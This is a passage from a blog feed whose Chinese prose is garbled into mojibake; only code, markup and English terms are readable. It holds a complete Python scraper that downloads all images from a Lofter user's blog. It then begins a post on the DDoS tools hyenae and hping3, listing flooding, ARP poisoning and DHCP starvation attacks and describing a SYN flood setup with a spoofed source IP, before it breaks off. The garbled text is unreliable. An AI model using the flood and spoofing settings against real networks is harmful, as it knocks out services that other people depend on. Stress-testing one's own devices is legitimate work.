<p>å¯ä»¥å‘ç°æ¯ç¯‡åšå®¢å†…æ‰€æœ‰å›¾ç‰‡çš„å¤§å›¾é“¾æ¥éƒ½æ˜¯ä¸Šå›¾æ¡†é€‰ä¸­è¿™æ ·çš„ï¼Œéƒ½æœ‰ç€åŒæ ·çš„å±æ€§<code>bigimgsrc</code>ï¼Œå¹¶ä¸”æ˜¯åšå®¢é¡µé¢å”¯ä¸€çš„ã€‚ç”±äºæ¯ç¯‡åšå®¢æºç å†…åŒ…å«äº†è¯¥ç¯‡åšå®¢æ‰€æœ‰çš„å›¾ç‰‡é“¾æ¥ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è·å–äº†æŸç¯‡åšå®¢çš„<code>html</code>æ–‡ä»¶åï¼Œä¾¿å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è·å–æ‰€æœ‰å›¾ç‰‡é“¾æ¥ã€‚</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº†çˆ¬å–<code>lofter</code>å•ç”¨æˆ·åšå®¢å›¾ç‰‡æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ˜¯æ—¶å€™ç¡®å®šçˆ¬å–æ–¹æ¡ˆäº†ã€‚</p>
<h2 id="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"><a href="#ç¡®å®šçˆ¬å–æ–¹æ¡ˆ" class="headerlink" title="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"></a>ç¡®å®šçˆ¬å–æ–¹æ¡ˆ</h2><p>é¦–å…ˆï¼Œæ ¹æ®ç»™å®šçš„<code>username</code>è·å–<code>uid</code>ä½œä¸º<code>POST</code>è¯·æ±‚åŒ…æ•°æ®ä¸­çš„ä¸€åˆ†å­ï¼›ç„¶åï¼Œå¾ªç¯æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ç›´è‡³å…¨éƒ¨çˆ¬å–å®Œæˆ</p>
<ol>
<li>ç”Ÿæˆæˆ–æ›´æ–°å½’æ¡£é¡µè¯·æ±‚æ•°æ®</li>
<li>æ¨¡æ‹Ÿå½’æ¡£é¡µé¢å‘é€POSTè¯·æ±‚</li>
<li>è§£æå“åº”æ•°æ®å¹¶è·å–åšå®¢é“¾æ¥</li>
<li>é€ä¸€çˆ¬å–åšå®¢å†…å®¹</li>
<li>è§£æåšå®¢å†…å®¹å¹¶è·å–å›¾ç‰‡é“¾æ¥</li>
<li>é€ä¸€ä¸‹è½½å›¾ç‰‡è‡³æœ¬åœ°</li>
</ol>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>æ–¹æ¡ˆç¡®å®šå¥½äº†ï¼Œé‚£å°±æ’¸èµ·è¢–å­åŠ æ²¹å¹²å§ï¼</p>
<h3 id="ä¾èµ–åº“"><a href="#ä¾èµ–åº“" class="headerlink" title="ä¾èµ–åº“"></a>ä¾èµ–åº“</h3><ul>
<li>requests</li>
</ul>
<p>Only one! æ²¡é”™ï¼Œä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å°±è¿™ä¸€ä¸ªï¼Œæ€ä¹ˆè£…å’±è¿™å°±ä¸è¯´äº†</p>
<h3 id="è·å–ç”¨æˆ·ID"><a href="#è·å–ç”¨æˆ·ID" class="headerlink" title="è·å–ç”¨æˆ·ID"></a>è·å–ç”¨æˆ·ID</h3><p>ç”¨æˆ·IDï¼Œç¡®åˆ‡çš„è¯´æ˜¯ç”¨æˆ·åšå®¢çš„å”¯ä¸€IDï¼Œæ˜¯å½’æ¡£é¡µè¯·æ±‚æŠ¥æ–‡ä¸­çš„å‚æ•°ä¹‹ä¸€ï¼Œé€šè¿‡æŸ¥çœ‹ä¸»é¡µæºç æ‰¾åˆ°äº†ç›¸åº”çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦ç”¨<code>request.get</code>æŠ“å–é¦–é¡µç„¶ååŒ¹é…IDå­—ç¬¦ä¸²å°±å¯ä»¥äº†ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="python">def _get_blogid(username):
    try:
        html = requests.get(&#39;http://%s.lofter.com&#39; % username)
        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;
        blogid = re.search(id_reg, html.text).group(1)
        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))
        return blogid
    except Exception as e:
        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)
        print(&#39;please check your username.&#39;)
        exit(1)
</code></pre>
<h3 id="ç”ŸæˆPOSTè¯·æ±‚æ•°æ®"><a href="#ç”ŸæˆPOSTè¯·æ±‚æ•°æ®" class="headerlink" title="ç”ŸæˆPOSTè¯·æ±‚æ•°æ®"></a>ç”ŸæˆPOSTè¯·æ±‚æ•°æ®</h3><p>æ ¹æ®å‰é¢å½’æ¡£é¡µçš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“POSTè¯·æ±‚ä¸­é™¤äº†ä¸€äº›å›ºå®šå‚æ•°å¤–ï¼Œè¿˜æœ‰ç”¨æˆ·IDï¼Œæ—¶é—´æˆ³<code>timestamp</code>ä»¥åŠå•æ¬¡è¯·æ±‚çš„åšå®¢ç¯‡æ•°<code>N</code>éœ€è¦ç¡®å®šï¼Œè€ŒIDå·²ç»åœ¨å‰é¢å·²ç»è·å–åˆ°äº†ï¼›åšå®¢ç¯‡æ•°å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªæ•°ï¼Œå¦‚40ï¼›æœ€åå°±å‰©ä¸‹æ—¶é—´æˆ³äº†ã€‚</p>
<p>ç»è¿‡å¤šæ¬¡å°è¯•å‘ç°ï¼Œè¿™ä¸ªæ—¶é—´æˆ³<code>timestamp</code>æ˜¯æ‰€æœ‰å‚æ•°ä¸­å”¯ä¸€ä¸€ä¸ªéœ€è¦åœ¨æ¯æ¬¡è¯·æ±‚ä¸­ä¸æ–­æ›´æ–°çš„å‚æ•°ã€‚é‚£ä¹ˆå®ƒæ›´æ–°çš„ä¾æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ¯ç¯‡åšå®¢éƒ½å¯¹åº”ç€ä¸€ä¸ª<code>timestamp</code>ï¼Œè€Œä¸”æ˜¯åšå®¢çš„å‘å¸ƒæ—¶é—´ï¼Œæ¯æ¬¡è¯·æ±‚åå¾—åˆ°çš„æœ€åä¸€ç¯‡åšå®¢çš„<code>timestamp</code>å°±å¯ä»¥ä½œä¸ºä¸‹ä¸€æ¬¡è¯·æ±‚çš„<code>timestamp</code>ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºæˆ‘å¤šæ¬¡å®éªŒå‘ç°ï¼Œåœ¨ç»™å®šä¸€ä¸ª<code>timestamp</code>å¹¶å‘é€POSTè¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¼š<strong>ä»¥è¯·æ±‚å‚æ•°ä¸­çš„æ—¶é—´æˆ³ä¸ºèµ·ç‚¹æŒ‰æ—¶é—´é¡ºåºå¾€å‰æ£€ç´¢å‡ºæŒ‡å®šç¯‡æ•°(å¦‚ï¼š40)çš„åšå®¢ä¿¡æ¯</strong></p>
<p>å“åº”åŒ…çš„åšå®¢ä¿¡æ¯ä¸­åŒ…å«äº†æ¯ç¯‡åšå®¢çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥æ¯æ¬¡è·å–å“åº”åŒ…åï¼Œåªè¦è§£æå‡ºå“åº”åŒ…ä¸­æœ€åä¸€ç¯‡åšå®¢çš„æ—¶é—´æˆ³ï¼Œå°±å¯ä»¥ä½œä¸ºä¸‹ä¸€æ¬¡è¯·æ±‚ä¸­çš„æ—¶é—´æˆ³ã€‚</p>
<p>æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œå¯ä»¥å†™å‡ºè·å–æ—¶é—´æˆ³çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="python"># time_pattern: re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))
def _get_timestamp(html, time_pattern):
    if not html:
        timestamp = round(time.time() * 1000)  # first timestamp(ms)
    else:
        timestamp = time_pattern.search(html).group(1)
    return str(timestamp)
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼Œé¦–æ¬¡è¯·æ±‚çš„æ—¶é—´æˆ³å¯ä»¥ç›´æ¥ä½¿ç”¨å½“å‰ç³»ç»Ÿæ—¶é—´(ms)</p>
</blockquote>
<h3 id="å‘é€POSTè¯·æ±‚åŒ…"><a href="#å‘é€POSTè¯·æ±‚åŒ…" class="headerlink" title="å‘é€POSTè¯·æ±‚åŒ…"></a>å‘é€POSTè¯·æ±‚åŒ…</h3><p>POSTè¯·æ±‚åŒ…çš„<code>url</code>æ˜¯å›ºå®šçš„ï¼Œ<code>data</code>å°±æ˜¯å‰é¢è·å–åˆ°çš„æ‰€æœ‰è¯·æ±‚å‚æ•°ï¼Œ<code>headers</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="python">headers = {
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,
        &#39;Host&#39;: username + &#39;.lofter.com&#39;,
        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;
    }
</code></pre>
<p>å…¶ä¸­ï¼Œ<code>User-Agent</code>ç”¨äºæ¨¡æ‹Ÿæµè§ˆå™¨è¯·æ±‚ï¼Œåé¢ä¸‰ä¸ªå‚æ•°æœ€å¥½éƒ½åŠ ä¸Šï¼Œå¦åˆ™å¯èƒ½æ— æ³•è¯·æ±‚æˆåŠŸã€‚POSTè¯·æ±‚å…¶å®å°±æ˜¯ä¸€æ¡è¯­å¥<code>requests.post</code>ï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="python">def _get_html(url, data, headers):
    try:
        html = requests.post(url, data, headers = headers)
    except Exception as e:
        print(&quot;get %s failed\n%s&quot; % (url, str(e)))
        return None
    finally:
        pass
    return html
</code></pre>
<h3 id="è§£æPOSTå“åº”åŒ…"><a href="#è§£æPOSTå“åº”åŒ…" class="headerlink" title="è§£æPOSTå“åº”åŒ…"></a>è§£æPOSTå“åº”åŒ…</h3><p>åœ¨è·å–å“åº”åŒ…çš„æ–‡æœ¬<code>html</code>åï¼Œä¾¿å¯ä»ä¸­è·å–æœ¬æ¬¡è¯·æ±‚å¾—åˆ°çš„æ‰€æœ‰åšå®¢çš„ç›¸å¯¹è·¯å¾„ï¼Œç„¶åç”Ÿæˆç»å¯¹è·¯å¾„ï¼Œè¿›è€Œé€ä¸€æŠ“å–åšå®¢åŸæ–‡ï¼Œä»åŸæ–‡ä¸­æŠ“å–æ‰€æœ‰å›¾é“¾ã€‚</p>
<pre><code class="python"># get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;
new_blogs = blog_url_pattern.findall(html)
num_new_blogs = len(new_blogs)
num_blogs += num_new_blogs

if num_new_blogs != 0:
    print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))
    # get imgurls from new_blogs
    imgurls = []
    for blog in new_blogs:
        imgurls.extend(_get_imgurls(username, blog, headers))
    num_imgs += len(imgurls)
</code></pre>
<p>ä»¥ä¸Šä»£ç ä¾¿æ˜¯è·å–POSTçš„å“åº”åŒ…<code>html</code>åçš„è§£ææ“ä½œï¼Œå…¶ä¸­<code>_get_imurls</code>æ˜¯ç”¨äºæŠ“å–åšå®¢åŸæ–‡å¹¶è§£æå‡ºæ‰€æœ‰å›¾é“¾çš„å‡½æ•°ã€‚</p>
<pre><code class="python">def _get_imgurls(username, blog, headers):
    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)
    blog_html = requests.get(blog_url, headers = headers).text
    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)
    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))
    return imgurls
</code></pre>
<h3 id="ä¸‹è½½å›¾ç‰‡"><a href="#ä¸‹è½½å›¾ç‰‡" class="headerlink" title="ä¸‹è½½å›¾ç‰‡"></a>ä¸‹è½½å›¾ç‰‡</h3><pre><code class="python">def _capture_images(imgurl, path):
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;}
    for i in range(1,3):
        try:
            image_request = requests.get(imgurl, headers = headers, timeout = 20)
            if image_request.status_code == 200:
                open(path, &#39;wb&#39;).write(image_request.content)
                break
        except requests.exceptions.ConnectionError as e:
            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))
            if i == 1:
                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)
                print(&#39;\tRetry &#39; + imgurl)
            else:
                print(&#39;\tRetry fail&#39;)
        except Exception as e:
            print(e)
        finally:
            pass

</code></pre>
<p>æœ‰äº†å›¾é“¾ï¼Œæœ€åçš„å·¥ä½œå½“ç„¶æ˜¯ä¸‹è½½å›¾ç‰‡äº†ï¼Œä¸Šé¢è¿™æ®µä»£ç ä¾¿æ˜¯ç”¨æ¥ä¸‹è½½å›¾ç‰‡çš„ï¼Œ<code>headers</code>æ˜¯ä¸ºäº†æ¨¡æ‹Ÿæµè§ˆå™¨è®¿é—®ã€‚é‚£ä¸ºä»€ä¹ˆè¦å°è¯•ä¸‹è½½ä¸¤æ¬¡å‘¢ï¼Ÿå› ä¸ºæˆ‘åœ¨æŠ“å–è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™ä¼šå‡ºç°æŠ“å–å¤±è´¥çš„æƒ…å†µï¼Œå¹¶æ˜¾ç¤ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ï¼š</p>
<pre><code class="yaml">&#39;Connection aborted.&#39;, RemoteDisconnected(&#39;Remote end closed connection without response&#39;
</code></pre>
<p>æ‰€ä»¥åœ¨<code>Retry</code>å‰å…ˆå°†å›¾é“¾å¯¹åº”çš„<code>host</code>ç¨åŠ ä¿®æ”¹,è¿™æ ·å¯ä»¥ä¿è¯æ›´é«˜çš„æˆåŠŸç‡ï¼Œä½†å¹¶ä¸èƒ½å®Œå…¨é¿å…ã€‚å¯¹äºä¸‹è½½å¤±è´¥çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯ï¼š</p>
<ol>
<li>è¢«åçˆ¬äº†ï¼ˆæå¤§å¯èƒ½ï¼‰</li>
<li>ç½‘ç»œé€šä¿¡ä¸ç•…ï¼ˆå¯èƒ½æ€§ä½ï¼‰</li>
<li>å›¾é“¾å¤±æ•ˆ</li>
<li>æœåŠ¡å™¨å‡ºæ¯›ç—…äº†</li>
</ol>
<p>æœ‰æ—¶å€™ï¼ŒåŒæ ·ä¸€ä¸ªå›¾é“¾ï¼Œè¿‡ä¸€æ®µæ—¶é—´å»æŠ“å°±å¥½äº†ï¼Œæˆ–è€…æ¢ä¸ªç½‘ç»œå°±å¥½äº†ã€‚æˆ‘çŒœæµ‹æ˜¯è¢«åçˆ¬ï¼Œä½†è¯æ®ä¸è¶³ï¼Œæ‰€ä»¥åªèƒ½é™ä½çˆ¬å–é¢‘ç‡ï¼Œæ¯”å¦‚æ¯å‘é€æ¥æ”¶ä¸€æ¬¡POSTè¯·æ±‚ä¾¿<code>sleep</code>10så·¦å³ï¼Œä½†è¿˜æ˜¯ä¼šæœ‰å¤±è´¥çš„æƒ…å†µï¼Œå¦‚æœå¤§å®¶æœ‰æ›´å¥½çš„æ„è§ï¼Œæ¬¢è¿äº¤æµã€‚ç›®å‰æƒ…å†µï¼Œæ­£å¸¸æƒ…å†µ100%çˆ¬å–å®Œå…¨æ²¡é—®é¢˜ï¼Œå¼‚å¸¸æƒ…å†µ90%ä»¥ä¸Šå§ã€‚</p>
<h3 id="ä¸»å¾ªç¯"><a href="#ä¸»å¾ªç¯" class="headerlink" title="ä¸»å¾ªç¯"></a>ä¸»å¾ªç¯</h3><p>å¥½äº†ï¼Œå…¶å®ƒé›¶ç¢çš„ä»£ç å°±ä¸å¤šè¯´äº†ï¼Œçˆ¬è™«ä¸»å¾ªç¯æµç¨‹å¦‚ä¸‹ï¼Œå…¶å®å°±æ˜¯ä»¥ä¸Šæ­¥éª¤çš„æ•´åˆï¼š</p>
<ol>
<li>çˆ¬å–å½’æ¡£é¡µé¢æŒ‡å®šç¯‡æ•°<code>query_number</code>çš„åšæ–‡é“¾æ¥<code>new_blogs</code></li>
<li>é€ä¸ªçˆ¬å–åšæ–‡<code>blog</code>æ•°æ®ï¼Œè·å–æ¯ç¯‡<code>blog</code>çš„æ‰€æœ‰å¤§å›¾é“¾æ¥<code>imgurls</code></li>
<li>é€ä¸ªçˆ¬å–å¤§å›¾é“¾æ¥<code>imgurls</code>,ä¸‹è½½å›¾ç‰‡è‡³æœ¬åœ°ç›®å½•</li>
<li>åˆ¤æ–­æ˜¯å¦å·²çˆ¬å–å®Œæ‰€æœ‰åšæ–‡<ul>
<li>è‹¥å·²çˆ¬å®Œï¼Œåˆ™æ˜¾ç¤ºçˆ¬å–æˆæœä¿¡æ¯ï¼Œå¹¶é€€å‡º</li>
<li>è‹¥æœªçˆ¬å®Œï¼Œåˆ™æ›´æ–°è¯·æ±‚åŒ…ä¸­çš„æ—¶é—´æˆ³<code>timestamp</code>ï¼Œè¿”å›ç¬¬1æ­¥ç»§ç»­çˆ¬å–æ–°çš„åšæ–‡</li>
</ul>
</li>
</ol>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><pre><code class="python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# date: 2018.03.07
&quot;&quot;&quot;Capture pictures from lofter with username.&quot;&quot;&quot;

import re
import os
import platform

import requests

import time
import random


def _get_path(username):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/lofter/&#39; + username,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/lofter/&#39; + username
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path


def _get_html(url, data, headers):
    try:
        html = requests.post(url, data, headers = headers)
    except Exception as e:
        print(&quot;get %s failed\n%s&quot; % (url, str(e)))
        return None
    finally:
        pass
    return html


def _get_blogid(username):
    try:
        html = requests.get(&#39;http://%s.lofter.com&#39; % username)
        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;
        blogid = re.search(id_reg, html.text).group(1)
        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))
        return blogid
    except Exception as e:
        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)
        print(&#39;please check your username.&#39;)
        exit(1)


def _get_timestamp(html, time_pattern):
    if not html:
        timestamp = round(time.time() * 1000)  # first timestamp(ms)
    else:
        timestamp = time_pattern.search(html).group(1)
    return str(timestamp)


def _get_imgurls(username, blog, headers):
    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)
    blog_html = requests.get(blog_url, headers = headers).text
    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)
    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))
    return imgurls


def _capture_images(imgurl, path):
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;}
    for i in range(1,3):
        try:
            image_request = requests.get(imgurl, headers = headers, timeout = 20)
            if image_request.status_code == 200:
                open(path, &#39;wb&#39;).write(image_request.content)
                break
        except requests.exceptions.ConnectionError as e:
            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))
            if i == 1:
                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)
                print(&#39;\tRetry &#39; + imgurl)
            else:
                print(&#39;\tRetry fail&#39;)
        except Exception as e:
            print(e)
        finally:
            pass


def _create_query_data(blogid, timestamp, query_number):
    data = {&#39;callCount&#39;:&#39;1&#39;,
    &#39;scriptSessionId&#39;:&#39;${scriptSessionId}187&#39;,
    &#39;httpSessionId&#39;:&#39;&#39;,
    &#39;c0-scriptName&#39;:&#39;ArchiveBean&#39;,
    &#39;c0-methodName&#39;:&#39;getArchivePostByTime&#39;,
    &#39;c0-id&#39;:&#39;0&#39;,
    &#39;c0-param0&#39;:&#39;number:&#39; + blogid,
    &#39;c0-param1&#39;:&#39;number:&#39; + timestamp,
    &#39;c0-param2&#39;:&#39;number:&#39; + query_number,
    &#39;c0-param3&#39;:&#39;boolean:false&#39;,
    &#39;batchId&#39;:&#39;123456&#39;}
    return data


def main():
    # prepare paramters
    username = &#39;litreily&#39;
    blogid = _get_blogid(username)
    query_number = 40
    time_pattern = re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))
    blog_url_pattern = re.compile(r&#39;s[\d]*\.permalink=&quot;([\w_]*)&quot;&#39;)

    # creat path to save imgs
    path = _get_path(username)

    # parameters of post packet
    url = &#39;http://%s.lofter.com/dwr/call/plaincall/ArchiveBean.getArchivePostByTime.dwr&#39; % username
    data = _create_query_data(blogid, _get_timestamp(None, time_pattern), str(query_number))
    headers = {
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,
        &#39;Host&#39;: username + &#39;.lofter.com&#39;,
        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;
    }

    num_blogs = 0
    num_imgs = 0
    index_img = 0
    print(&#39;------------------------------- start line ------------------------------&#39;)
    while True:
        html = _get_html(url, data, headers).text
        # get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;
        new_blogs = blog_url_pattern.findall(html)
        num_new_blogs = len(new_blogs)
        num_blogs += num_new_blogs

        if num_new_blogs != 0:
            print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))
            # get imgurls from new_blogs
            imgurls = []
            for blog in new_blogs:
                imgurls.extend(_get_imgurls(username, blog, headers))
            num_imgs += len(imgurls)

            # download imgs
            for imgurl in imgurls:
                index_img += 1
                paths = &#39;%s/%d.%s&#39; % (path, index_img, re.search(r&#39;(jpg|png|gif)&#39;, imgurl).group(0))
                print(&#39;{}\t{}&#39;.format(index_img, paths))
                _capture_images(imgurl, paths)

        if num_new_blogs != query_number:
            print(&#39;------------------------------- stop line -------------------------------&#39;)
            print(&#39;capture complete!&#39;)
            print(&#39;captured blogs:%d images:%d&#39; % (num_blogs, num_imgs))
            print(&#39;download path:&#39; + path)
            print(&#39;-------------------------------------------------------------------------&#39;)
            break

        data[&#39;c0-param1&#39;] = &#39;number:&#39; + _get_timestamp(html, time_pattern)
        print(&#39;The next TimeStamp is : %s\n&#39; % data[&#39;c0-param1&#39;].split(&#39;:&#39;)[1])
        # wait a few second
        time.sleep(random.randint(5,10))


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<h2 id="çˆ¬å–æµ‹è¯•"><a href="#çˆ¬å–æµ‹è¯•" class="headerlink" title="çˆ¬å–æµ‹è¯•"></a>çˆ¬å–æµ‹è¯•</h2><p><img src="/assets/spider/lofter/lofter_spider.png" alt="lofter spider"></p>
<p><img src="/assets/spider/lofter/pictures.png" alt="pictures"></p>
<h2 id="è¯´åœ¨æœ€å"><a href="#è¯´åœ¨æœ€å" class="headerlink" title="è¯´åœ¨æœ€å"></a>è¯´åœ¨æœ€å</h2><ul>
<li>Github æºç ï¼š<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">https://github.com/Litreily/capturer</a></li>
<li>æ¬¢è¿äº¤æµæ¢è®¨ä¸STAR</li>
<li>è¯·èŠ‚åˆ¶ä½¿ç”¨ï¼</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> lofter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¸¤æ¬¾å®ç”¨çš„DDosæ”»å‡»å·¥å…·]]></title>
      <url>https://www.litreily.top/2018/02/22/ddos-attack/</url>
      <content type="html"><![CDATA[<p>ä¹‹å‰ä¸ºäº†é‡ç°æŸä¸ªbugï¼Œéœ€è¦å¯¹ç½‘ç»œè®¾å¤‡è¿›è¡Œddosæ”»å‡»æµ‹è¯•ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¯¹è®¾å¤‡çš„ç½‘ç»œæ”»å‡»é˜²æŠ¤åŠŸèƒ½è¿›è¡ŒæŠ—å‹æµ‹è¯•ã€‚ä¸´é˜µç£¨æªï¼Œgoogleäº†ä¸¤æ¬¾æ”»å‡»å·¥å…·ï¼Œwindowså¹³å°çš„<code>hyenae</code>ï¼Œä»¥åŠLinuxå¹³å°çš„<code>hping3</code>ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ä¸¤è€…çš„ç”¨æ³•ã€‚</p>
<h2 id="Hyenae"><a href="#Hyenae" class="headerlink" title="Hyenae"></a>Hyenae</h2><p><code>hyenae</code>æ˜¯åœ¨<code>Windows</code>å¹³å°ä¸Šéå¸¸å¥½ç”¨çš„ä¸€æ¬¾<code>ddos</code>æ”»å‡»å·¥å…·ï¼Œå¯ä»¥å®Œæˆç»å¤§å¤šæ•°çš„æ”»å‡»æ“ä½œã€‚</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><ul>
<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
</ul>
<h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul>
<li>ARP-Request flooding</li>
<li>ARP-Cache poisoning</li>
<li>PPPoE session initiation flooding</li>
<li>Blind PPPoE session termination</li>
<li>ICMP-Echo flooding</li>
<li>ICMP-Smurf attack</li>
<li>ICMP based TCP-Connection reset</li>
<li>TCP-SYN flooding</li>
<li>TCP-Land attack</li>
<li>Blind TCP-Connection reset</li>
<li>UDP flooding</li>
<li>DNS-Query flooding</li>
<li>DHCP-Discover flooding</li>
<li>DHCP starvation attack</li>
<li>DHCP-Release forcing</li>
<li>Cisco HSRP active router hijacking</li>
<li>Pattern based packet address configuration</li>
<li>Intelligent address and address protocol detection</li>
<li>Smart wildcard-based randomization</li>
<li>Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support</li>
</ul>
<h3 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h3><p><img src="/assets/network/hyenae-interface.png" alt="hyenae interface"></p>
<p><code>hyenae</code>çš„ç•Œé¢æ¯”è¾ƒç®€å•ï¼Œå›¾ä¸­å±•ç¤ºçš„æ˜¯<code>SYN/ACK</code>æ´ªæ³›æ”»å‡»çš„é…ç½®é€‰é¡¹ã€‚</p>
<ul>
<li><code>operation mode</code>ä¸­å¯ä»¥é€‰æ‹©ç½‘å¡</li>
<li><code>Network Protocol</code>ä¸­å¯ä»¥é€‰æ‹©æ”»å‡»æ–¹å¼å¯¹åº”çš„ç½‘ç»œåè®®ï¼Œå¦‚<code>SYN</code>æ´ªæ³›æ”»å‡»å¯¹åº”ä¼ è¾“å±‚çš„<code>TCP</code>ï¼Œ<code>IP</code>åè®®å¯é€‰<code>IPv4, IPv6</code></li>
<li>æ”»å‡»æºçš„<code>IP</code>,<code>MAC</code>åœ°å€ä»¥åŠç«¯å£å·å¯ä»¥éå¸¸çµæ´»çš„è®¾ç½®ï¼ŒæŒ‰<code>MAC-IP@port</code>çš„æ ¼å¼ä¹¦å†™ï¼Œå¦‚å›¾ä¸­çš„æ”»å‡»æºåŒ¹é…æ¨¡å¼<code>%-172.17.14.158@80</code><ul>
<li>% ä»£è¡¨ä»»æ„ï¼Œåœ¨æ­¤å¤„ä»£è¡¨ä»»æ„çš„MACåœ°å€</li>
<li>172.17.14.158ä¸ºä¼ªé€ çš„æ”»å‡»æºIPï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä»»æ„çš„åˆæ³•IP</li>
<li>80ä¸ºç«¯å£å·ï¼Œ80åŒæ—¶ä¹Ÿæ˜¯ç½‘ç»œæœåŠ¡å™¨çš„é»˜è®¤ç«¯å£</li>
</ul>
</li>
<li>æ”»å‡»ç›®æ ‡çš„è®¾ç½®æ–¹å¼ä¸æ”»å‡»æºä¸€è‡´ï¼Œå›¾ä¸­çš„<code>%-172.17.14.10@80</code><ul>
<li>% éšæœºç”ŸæˆMACåœ°å€</li>
<li>172.17.14.10ä»£è¡¨è¢«æ”»å‡»çš„IP</li>
<li>80ä¸ºæ”»å‡»ç›®æ ‡çš„è¢«æ”»å‡»ç«¯å£å·</li>
</ul>
</li>
<li>é’ˆå¯¹<code>TCP</code>åè®®ï¼Œå³ä¾§ç»™å‡ºå…¶å¯¹åº”çš„<code>5</code>ä¸ªå¸¸è§<code>flags</code>: <code>FIN, SYN, RST, PSH, ACK</code><ul>
<li>å¯ä»¥éšæ„è¿›è¡Œå•é€‰æˆ–å¤šé€‰ï¼Œä»¥å®ç°ä¸åŒçš„æ”»å‡»æ–¹å¼</li>
